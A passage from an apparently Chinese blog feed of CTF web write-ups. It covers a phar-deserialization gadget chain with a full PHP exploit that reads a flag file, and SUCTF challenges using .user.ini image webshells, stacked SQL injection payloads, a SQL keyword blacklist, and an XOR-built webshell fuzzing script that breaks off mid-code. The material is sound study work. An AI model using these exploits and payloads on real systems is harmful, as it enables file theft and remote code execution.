class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $size = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        $units = <span class="keyword">array</span>(<span class="string">' B'</span>, <span class="string">' KB'</span>, <span class="string">' MB'</span>, <span class="string">' GB'</span>, <span class="string">' TB'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $size &gt;= <span class="number">1024</span> &amp;&amp; $i &lt; <span class="number">4</span>; $i++) $size /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round($size, <span class="number">2</span>).$units[$i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>跟进File类的open()方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>发现存在<code>file_exists($filename)</code>，根据前置知识可以知道，这里的<code>$filename</code>如果我们传入<code>phar://</code>伪协议的话会触发反序列化，接下来的问题就是寻找利用点。</p><p>同样在File类，发现存在<code>$this-&gt;close()</code>方法可以读取文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在FileList类中，有__call()魔法函数，当FileList类的实例调用本类不存在的方法时，File类的$file实例将会调用该方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        $filenames = scandir($path);</span><br><span class="line"></span><br><span class="line">        $key = array_search(<span class="string">"."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line">        $key = array_search(<span class="string">".."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($filenames <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">            $file = <span class="keyword">new</span> File();  <span class="comment"># File对象</span></span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, $file);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); <span class="comment"># $file-&gt;close()</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ......略</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看User类，发现它最后会调用一个close()方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ......略</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>整理思路：实例化User类，令$db为一个FileList类的对象，但是FileList类没有close()方法，将会调用__call()方法，而call()方法会调用File对象的close()方法，重写$filename，使file_get_contents($filename)读取指定文件，最后FileList对象调用__destruct()，将函数执行结果打印出来。</strong></p><p><strong>注意：这里可能有人和我之前想的一样：直接让$db赋值为File对象不就行了？但是这样不会调用__destruct()将函数读取的内容返回，所以我们必须要利用到FileList对象</strong></p><p>Exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//1. 用这个构造一个 phar.phar</span></span><br><span class="line"><span class="comment">//2. 重命名为 phar.jpg，传上去</span></span><br><span class="line"><span class="comment">//3. POST 访问 /delete.php ，filename = phar://phar.jpg/</span></span><br><span class="line"><span class="comment">//4. flag 到手~</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File();</span><br><span class="line">        $file-&gt;filename = <span class="string">'/flag.txt'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line">ini_set(<span class="string">'phar.readonly'</span>,<span class="number">0</span>);</span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$o-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"exp.txt"</span>, <span class="string">"glzjin"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>删除文件时抓包，phar://协议访问指定文件读取flag：</p><p><img src="https://t1.picb.cc/uploads/2019/08/27/gbTbgg.png" alt=""></p><p><strong>PS：</strong><code>php://filter/resource=phar://</code>之类的伪协议可以用来绕过限制开头不能为<code>phar://</code>（参考SUCTF upload 2），这里尝试失败，但还是记录一下。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/2715" target="_blank" rel="noopener">初探phar://</a></p><p><a href="https://www.cnblogs.com/kevinbruce656/p/11316070.html" target="_blank" rel="noopener">ciscn2019华北赛区半决赛day1_web1题解</a></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>复现 SUCTF Upload 2失败2333，还是tcl。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;今天复现时发现自己关于phar反序列化了解得不够，特地记录一下加深印象。&lt;/p&gt;
&lt;h2 id=&quot;前置知识&quot;&gt;&lt;a href=&quot;#前置知识&quot;
      
    
    </summary>
    
    
    
      <category term="Web" scheme="https://www.sketchplane.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>SUCTF Web部分</title>
    <link href="https://www.sketchplane.top/2019/08/23/SUCTF-Web%E9%83%A8%E5%88%86/"/>
    <id>https://www.sketchplane.top/2019/08/23/SUCTF-Web%E9%83%A8%E5%88%86/</id>
    <published>2019-08-23T12:16:49.000Z</published>
    <updated>2019-08-26T03:19:00.210Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天打的一个比赛，有些自闭，趁着有时间（X-NCUA做不出来2333）来复现一下。</p><h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>后缀过滤了.php/.phtml等等，但是.php./.user.ini可以上传；内容过滤了&lt;?，另外有exif_imagetype()监测是否为图片。</p><p><strong>解题思路：</strong>这里直接给出P牛的<a href="http://www.vuln.cn/6001" target="_blank" rel="noopener">文章</a>，利用.user.ini设置自动包含我们事先上传好的图片马，访问上传目录上的<code>index.php</code>执行命令即可读取flag。</p><p><strong>注意：</strong>这个方法有一个前提，正如P牛文章里说的，需要上传目录存在一个php文件(即本题上传目录中的index.php)才能包含上传的图片马。</p><p><img src="https://t1.picb.cc/uploads/2019/08/23/gaEPjd.png" alt=""></p><h2 id="Pythonginx"><a href="#Pythonginx" class="headerlink" title="Pythonginx"></a>Pythonginx</h2><p>这道题考的<code>Unicode</code>编码问题，参考<code>Black Hat 2019</code>的PPT：<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">Black Hat 2019</a></p><p>再根据提示尝试访问nginx的配置文件：</p><p><img src="https://t1.picb.cc/uploads/2019/08/25/gbC65J.png" alt=""></p><p>读<code>/usr/fffffflag</code>获取flag：</p><p><img src="https://t1.picb.cc/uploads/2019/08/25/gbCIS0.png" alt=""></p><h2 id="easySql"><a href="#easySql" class="headerlink" title="easySql"></a>easySql</h2><p>人工Fuzz了一下，发现可以堆叠注入，爆了一波库名和表名：ctf –&gt; Flag</p><p><img src="https://t1.picb.cc/uploads/2019/08/25/gbcjFL.png" alt=""></p><p>但是过滤了<code>flag和from</code>，没有办法直接查出flag。</p><p><strong>看wp说有源码泄露，2333</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">    $post = <span class="keyword">array</span>();</span><br><span class="line">    $get = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">global</span> $MysqlLink;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//GetPara();</span></span><br><span class="line">    $MysqlLink = mysqli_connect(<span class="string">"localhost"</span>,$datauser,$datapass);</span><br><span class="line">    <span class="keyword">if</span>(!$MysqlLink)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Mysql Connect Error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $selectDB = mysqli_select_db($MysqlLink,$dataName);</span><br><span class="line">    <span class="keyword">if</span>(!$selectDB)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Choose Database Error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($v)&amp;&amp;is_string($v))&#123;</span><br><span class="line">            $post[$k] = trim(addslashes($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//die();</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt; Give me your flag, I will tell you <span class="keyword">if</span> the flag is right. &lt;/ a&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"query"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">        $BlackList = <span class="string">"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\""</span>;</span><br><span class="line">        <span class="comment">//var_dump(preg_match("/&#123;$BlackList&#125;/is",$post['query']));</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/&#123;$BlackList&#125;/is"</span>,$post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">            <span class="comment">//echo $post['query'];</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Nonono."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen($post[<span class="string">'query'</span>])&gt;<span class="number">40</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Too long."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql = <span class="string">"select "</span>.$post[<span class="string">'query'</span>].<span class="string">"||flag from Flag"</span>;</span><br><span class="line">        mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>($res = mysqli_store_result($MysqlLink))&#123;</span><br><span class="line">                <span class="keyword">while</span>($row = mysqli_fetch_row($res))&#123;</span><br><span class="line">                    print_r($row);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">while</span>(@mysqli_next_result($MysqlLink));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现查询语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"select "</span>.$post[<span class="string">'query'</span>].<span class="string">"||flag from Flag"</span>;</span><br></pre></td></tr></table></figure><p>于是这里出现了一个非预期：<code>query=*,1</code></p><p>因为 <code>1||flag</code> == 1，然后可以查询Flag表里所有内容。</p><p><img src="https://t1.picb.cc/uploads/2019/08/25/gbm8sX.png" alt=""></p><p>预期解是利用 <code>set sql_mode=&#39;pipes_as_concat&#39;</code>，改变<code>||</code>让它具有拼接字符串的功能，本地测试如下：</p><p><img src="https://t1.picb.cc/uploads/2019/08/25/gb1kiX.png" alt=""></p><p>于是构造<code>payload：1;set sql_mode=pipes_as_concat;select 1</code></p><p>因为有长度限制所以payload尽量精简。</p><p><img src="https://t1.picb.cc/uploads/2019/08/25/gb1ODd.png" alt=""></p><h2 id="easyPHP"><a href="#easyPHP" class="headerlink" title="easyPHP"></a>easyPHP</h2><p>这题一共有三层，前前后后看了不少文章，学到了挺多知识。</p><ul><li>异或构造不包含字母数字的web shell</li><li>.htaccess文件上传</li><li>bypass open_basedir</li></ul><p>首先看题目代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码可以分成两部分，我们先看第一部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 限制长度</span></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 好狠一正则</span></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"><span class="comment">//统计字节值出现次数，少于12</span></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>为了执行get_the_flag()函数，我们需要绕过过滤执行eval()，观察发现正则没有过滤<code>^</code>，考虑抑或出<code>_GET</code>来执行命令。</p><p>这里我们可以先Fuzz一下构成我们需要的<code>_GET</code>的字符有哪些，贴一个<strong>@tr1ple</strong>师傅的脚本(tql)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">ee= string.printable  <span class="comment"># 可打印字符集合</span></span><br><span class="line">a= map(<span class="keyword">lambda</span> x:x.encode(<span class="string">"hex"</span>),list(ee))  <span class="comment"># map(func)函数对传入列表的每个元素执行func操作;lambda表达式以 ":"区分参数和语句</span></span><br><span class="line">_=[]</span><br><span class="line">G=[]</span><br><span class="line">E=[]</span><br><span class="line">T=[]</span><br><span class="line"><span class="keyword">print</span> 